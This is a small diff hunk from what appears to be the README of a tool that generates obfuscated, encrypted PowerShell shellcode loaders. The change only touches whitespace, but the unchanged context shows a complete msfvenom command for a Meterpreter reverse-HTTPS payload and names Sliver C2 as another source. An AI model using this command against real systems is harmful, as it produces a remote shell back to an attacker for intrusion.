@@ -41,7 +41,7 @@ It generates an obfuscated and encrypted shellcode loader PowerShell script that
 ```
 
 #### INPUT (Shellcode formats)  
-- Metasploit C2 Framework
+- Metasploit C2 Framework  
   ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode```  
   
 - Sliver C2 Framework  
